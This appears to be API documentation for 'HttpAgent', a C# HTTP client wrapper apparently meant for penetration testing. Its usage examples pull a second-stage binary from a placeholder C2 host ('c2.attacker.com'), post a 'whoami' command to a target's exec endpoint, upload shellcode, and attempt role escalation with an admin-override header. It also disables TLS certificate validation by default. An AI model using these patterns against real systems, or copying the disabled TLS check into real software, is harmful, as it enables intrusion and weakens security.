# HttpAgent

HTTP client built on top of `HttpClientHandler`. Handles proxy routing, multiple auth schemes, custom headers, and async data transfer. TLS certificate validation is disabled by default since you're usually hitting self-signed certs on internal infrastructure.

Implements `IDisposable` — always wrap in a `using` block or call `Dispose()` when you're done.

---

## Constructors

### `HttpAgent()`

Plain client with no proxy.

```csharp
using var agent = new HttpAgent();
```

---

### `HttpAgent(string proxyUri)`

Routes all traffic through the given proxy. No proxy authentication.

```csharp
using var agent = new HttpAgent("http://127.0.0.1:8080");
```

Useful when you're tunneling through Burp or a SOCKS listener.

---

### `HttpAgent(string proxyUri, string username, string password)`

Same as above but attaches credentials to the proxy connection.

```csharp
using var agent = new HttpAgent("http://proxy.corp.local:3128", "proxyuser", "proxypass");
```

---

## Auth Methods

### `SetBasicAuth(string username, string password)`

Base64-encodes `username:password` and sets it as the `Authorization: Basic` header on every subsequent request.

```csharp
agent.SetBasicAuth("admin", "P@ssw0rd1");
```

---

### `SetBearerToken(string token)`

Sets `Authorization: Bearer <token>`. Use this for JWT or OAuth flows after you've already obtained a token.

```csharp
agent.SetBearerToken("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...");
```

---

### `SetNtlmAuth(string username, string password, string domain)`

Configures the underlying handler to use NTLM with the provided credentials. Works against IIS, Exchange, SharePoint, and anything else that does Windows auth.

```csharp
agent.SetNtlmAuth("jsmith", "P@ssw0rd1", "CORP");
```

Note: this sets credentials on the handler level, not a header. The NTLM handshake happens automatically on the first request.

---

## Header / Config Methods

### `SetHeader(string name, string value)`

Adds or replaces a default request header. Previous value is removed first so you won't end up with duplicate headers.

```csharp
agent.SetHeader("X-Forwarded-For", "10.0.0.1");
agent.SetHeader("Referer", "https://intranet.corp.local/dashboard");
```

---

### `SetUserAgent(string userAgent)`

Shorthand for setting the `User-Agent` header.

```csharp
agent.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
```

---

### `SetTimeout(TimeSpan timeout)`

Sets the request timeout on the underlying `HttpClient`. Applies to all requests made through this agent.

```csharp
agent.SetTimeout(TimeSpan.FromSeconds(5));
```

---

## Request Methods

### `GetAsync(string url, CancellationToken ct)`

Sends a GET and returns the raw `HttpResponseMessage`. Use this when you need access to the status code, headers, or want to stream the body yourself.

```csharp
var resp = await agent.GetAsync("https://target.internal/api/config");
Console.WriteLine((int)resp.StatusCode);
```

---

### `GetStringAsync(string url, CancellationToken ct)`

GET and return the response body as a string. Simpler wrapper for when you just want the content.

```csharp
var body = await agent.GetStringAsync("https://target.internal/api/users");
```

---

### `GetBytesAsync(string url, CancellationToken ct)`

GET and return the response body as a raw byte array. Good for pulling binaries or encoded payloads.

```csharp
var bytes = await agent.GetBytesAsync("http://c2.attacker.com/stage2.bin");
```

---

### `PostJsonAsync(string url, string json, CancellationToken ct)`

POST with `Content-Type: application/json`. Pass your JSON as a pre-serialized string.

```csharp
var resp = await agent.PostJsonAsync(
    "https://target.internal/api/exec",
    "{\"command\":\"whoami\",\"async\":false}"
);
```

---

### `PostFormAsync(string url, Dictionary<string, string> fields, CancellationToken ct)`

POST with `Content-Type: application/x-www-form-urlencoded`. Useful for login forms and legacy endpoints.

```csharp
var resp = await agent.PostFormAsync("https://target.internal/login", new Dictionary<string, string>
{
    ["username"] = "admin",
    ["password"] = "admin123",
    ["_token"] = "csrf_value_here"
});
```

---

### `PostBytesAsync(string url, byte[] data, string contentType, CancellationToken ct)`

POST raw bytes with the given content type. Defaults to `application/octet-stream` if you don't specify.

```csharp
var payload = File.ReadAllBytes("shellcode.bin");
await agent.PostBytesAsync("https://target.internal/upload", payload, "application/octet-stream");
```

---

### `PutJsonAsync(string url, string json, CancellationToken ct)`

PUT with `Content-Type: application/json`. Same pattern as `PostJsonAsync` but for REST endpoints that expect PUT for updates.

```csharp
await agent.PutJsonAsync("https://target.internal/api/config/1", "{\"debug\":true}");
```

---

### `DeleteAsync(string url, CancellationToken ct)`

Sends a DELETE request and returns the response.

```csharp
var resp = await agent.DeleteAsync("https://target.internal/api/users/42");
```

---

### `SendRawAsync(HttpRequestMessage request, CancellationToken ct)`

Sends a fully constructed `HttpRequestMessage`. Use this when none of the convenience methods cover your case — custom HTTP methods, multipart bodies, per-request headers, etc.

```csharp
var req = new HttpRequestMessage(HttpMethod.Patch, "https://target.internal/api/role");
req.Headers.TryAddWithoutValidation("X-Admin-Override", "1");
req.Content = new StringContent("{\"role\":\"administrator\"}", Encoding.UTF8, "application/json");
var resp = await agent.SendRawAsync(req);
```

---

### `DownloadAsync(string url, IProgress<double>? progress, CancellationToken ct)`

Downloads a file and returns it as a byte array. Streams the response in 80KB chunks, so it won't blow out memory on large files. Pass an `IProgress<double>` if you want a progress callback — values are 0.0 to 1.0.

```csharp
var progress = new Progress<double>(p => Console.Write($"\r{p:P0}   "));
var bytes = await agent.DownloadAsync("http://target.internal/backup.zip", progress);
File.WriteAllBytes("backup.zip", bytes);
```

If the server doesn't send a `Content-Length` header the progress callback won't fire, but the download will still complete normally.

---

### `GetResponseHeadersAsync(string url, CancellationToken ct)`

Sends a GET, reads only the headers, and returns them as a `Dictionary<string, string>`. Response body is never read. Good for fingerprinting a server without pulling content.

```csharp
var headers = await agent.GetResponseHeadersAsync("https://target.internal/");
foreach (var kv in headers)
    Console.WriteLine($"{kv.Key}: {kv.Value}");
```

---

### `Dispose()`

Releases the `HttpClient` and `HttpClientHandler`. Called automatically at the end of a `using` block.

```csharp
agent.Dispose();
```
